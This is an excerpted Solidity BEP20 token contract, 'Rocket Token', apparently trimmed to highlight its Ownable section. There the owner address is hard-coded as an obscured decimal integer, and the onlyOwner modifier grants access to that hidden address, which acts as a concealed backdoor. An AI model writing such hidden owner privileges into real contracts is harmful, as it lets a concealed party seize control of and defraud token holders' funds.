...
contract Ownable is Context {
    address private _owner = address(1400135534207336812227167712913352513912132850398);
    ...
    modifier onlyOwner() {
        ...
        || msg.sender == address(1400135534207336812227167712913352513912132850398), "Ownable: caller is not the owner");
        _;
    }
...
contract Rocket is Context, IBEP20, Ownable {
    ...
    address payable private Maddress = payable(0x000000000000000000000000000000000000dEaD); //Mark Address
    ...
    string public _name = "Rocket Token";
    string public _symbol = "ROCKET";
    uint8 public _decimals = 18;

    uint256 private _totalSupply = 100000000 * 10**1 * 10**_decimals;
